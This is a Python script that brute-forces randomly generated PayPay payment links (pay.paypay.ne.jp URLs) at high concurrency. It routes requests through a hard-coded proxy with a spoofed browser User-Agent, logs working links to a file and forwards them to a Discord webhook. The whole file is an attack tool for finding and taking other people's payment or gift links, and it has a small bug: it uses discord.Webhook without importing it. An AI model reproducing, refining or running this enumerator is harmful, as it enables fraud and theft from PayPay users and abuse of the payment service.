import aiohttp
import asyncio
import random
import string
import json
import os
from datetime import datetime
from colorama import Fore, Style, init

init()

PROXY = "http://43.133.22.248:9091"
CONFIG_PATH = "config/config.json"
HIT_FILE_PATH = "hit.txt"
MAX_CONCURRENT = 100

def load_config():
    try:
        with open(CONFIG_PATH, 'r') as f:
            return json.load(f)
    except:
        return {}

def generate_paypay_link():
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    return f"https://pay.paypay.ne.jp/{random_part}"

async def save_hit(link, session):
    with open(HIT_FILE_PATH, 'a') as f:
        f.write(f"{link}\n")
    
    config = load_config()
    webhook_url = config.get("discord_webhook")
    
    if webhook_url:
        try:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            await webhook.send(f"{link}")
        except:
            pass

async def check_link(session, link, link_id, total_links, semaphore):
    async with semaphore:
        try:
            connector = aiohttp.TCPConnector()
            timeout = aiohttp.ClientTimeout(total=5)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            async with session.get(link, headers=headers, proxy=PROXY, timeout=timeout) as response:
                success = response.status == 200
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if success:
                    log_entry = f"{timestamp}[-] {Fore.GREEN}success{Style.RESET_ALL} {link}"
                    await save_hit(link, session)
                else:
                    log_entry = f"{timestamp}[-] {Fore.RED}failure{Style.RESET_ALL} {link}"
                
                print(log_entry)
                
        except:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_entry = f"{timestamp}[-] {Fore.RED}failure{Style.RESET_ALL} {link}"
            print(log_entry)

async def main():
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)
    
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        link_id = 0
        
        try:
            while True:
                tasks = []
                for _ in range(MAX_CONCURRENT):
                    link = generate_paypay_link()
                    task = asyncio.create_task(check_link(session, link, link_id, MAX_CONCURRENT, semaphore))
                    tasks.append(task)
                    link_id += 1
                
                await asyncio.gather(*tasks)
                
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass